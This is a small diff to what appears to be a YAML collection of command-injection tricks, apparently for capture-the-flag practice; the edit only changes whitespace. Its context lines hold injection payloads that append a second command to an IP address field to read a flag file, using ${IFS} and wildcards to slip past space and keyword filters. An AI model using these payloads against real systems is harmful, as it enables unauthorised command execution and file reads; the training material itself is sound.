@@ -56,7 +56,6 @@ tricks:
     payload: |
       # Space filtered -> use ${IFS}
       8.8.8.8;cat${IFS}/FLAG.txt
-      
+
       # Keyword filtered -> use wildcards
       8.8.8.8;cat${IFS}/FL*
-
